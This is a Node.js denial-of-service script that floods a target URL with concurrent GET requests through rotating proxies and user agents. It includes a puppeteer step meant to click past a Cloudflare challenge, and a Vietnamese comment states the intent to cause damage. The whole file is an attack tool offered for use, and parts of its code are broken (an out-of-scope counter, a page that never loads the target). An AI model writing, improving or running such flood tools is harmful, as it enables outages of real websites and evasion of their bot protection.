const axios = require('axios');
const puppeteer = require('puppeteer');
const fs = require('fs');
(async () => {
  const url = process.argv[2];
  const runtime = parseInt(process.argv[3]) || 120;
  const thread = parseInt(process.argv[4]) || 10;
  const proxyList = await getProxyList('proxy.txt');
  const userAgentList = await getUserAgentList('ua.txt');
  const headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0 Chrome/100.0.0.0 Safari/100.0.0.0 Edge/100.0.0.0 AppleWebKit/100.0.0.0 (KHTML, like Gecko) Chrome/100.0.0.0 Mobile/100.0.0.0 Safari/100.0.0.0 OPR/100.0.0.0 (Edition YX 10) Opera/100.0.0.0 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36 Edg/100.0.0.0',  ////userAgentList[0], //+ 'x-attacker',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    Connection: 'keep-alive',
    'X-Attacker': 'yes',
  };
  const browser = await puppeteer.launch({ args: [`--proxy-server=${proxyList[0]}`] });
  const page = await browser.newPage();
  const cloudflareButton = await page.$('.big-button.pow-button');
  if (cloudflareButton) {
    const { x, y, width, height } = await cloudflareButton.boundingBox();
    await page.hover('.big-button.pow-button');
    await page.mouse.click(x + width / 2, y + height / 2);
    await page.waitForTimeout(6000);
  }
  await browser.close();
  const promises = [];
  const startTime = Date.now();
  const endTime = startTime + runtime * 1000;
  for (let i = 0; i < thread; i++) {
    promises.push(makeRequests(url, headers, proxyList, userAgentList, endTime));
  }
  await Promise.all(promises);
  console.log(`Attack completed after ${count} requests`);
  async function makeRequests(url, headers, proxyList, userAgentList, endTime) {
    let count = 0;
    while (Date.now() < endTime) {
      count += 1;
      const proxyIndex = count % proxyList.length;
      const userAgentIndex = count % userAgentList.length;
      headers['User-Agent'] = userAgentList[userAgentIndex] + 'x-attacker';
      try {
        await makeRequest(url, headers, proxyList[proxyIndex]);
        console.log(`${count}`);
      } catch (error) {
        console.log(`Error: ${error}`);
      }
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
  }
  async function makeRequest(url, headers, proxy) {
    const response = await axios.get(url, { headers, proxy, timeout: 60000 });
    if (response.status === 200) {
      // Gửi các yêu cầu không hợp lệ để gây sát thương
    }
  }
  async function getProxyList(file) {
    try {
      const data = await fs.promises.readFile(file, 'utf8');
      return data.split('\n');
    } catch (error) {
      console.log(`Error reading proxy file: ${error}`);
      return [];
    }
  }
  async function getUserAgentList(file) {
    try {
      const data = await fs.promises.readFile(file, 'utf8');
      return data.split('\n');
    } catch (error) {
      console.log(`Error reading user agent file: ${error}`);
      return [];
    }
  }
})();
